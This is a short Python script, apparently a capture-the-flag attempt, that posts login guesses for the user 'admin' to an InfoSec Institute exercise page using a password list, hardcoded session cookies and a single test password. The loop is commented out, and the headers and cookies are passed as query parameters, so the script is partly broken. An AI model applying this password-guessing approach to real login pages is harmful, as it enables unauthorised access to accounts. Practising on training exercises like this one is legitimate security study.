import requests

url = "http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php"
user_agent = "Mozilla/5.0 (X11; Linux i686; rv:61.0) Gecko/20100101 Firefox/61.0"
user = "admin"

cookie = {"_ga":"GA1.2.1198955480.1528503806", "visitor_id12882":455536948, "visitor_id12882-hash":"922d8ae9df896962dd3d248a175b3218fadba2e174b5c9fa61b799f3c87c493a9ff66e45c4e21bff8cac27c0091764905626a059", "PHPSESSID":"h2qcu3f2hn2vsvl9p8ththetm6", "welcome":"no"}

data = {"User-Agent":user_agent, "username":user, "password":"", "logIn":"Login", "Cookie":cookie}

listfile = open("passwords.lst", "r")
#for line in listfile:
line = "princess"
print("we're trying for {}".format(line))
data['password'] = line	
result = requests.post(url, params=data)
print(result.text)
listfile.close()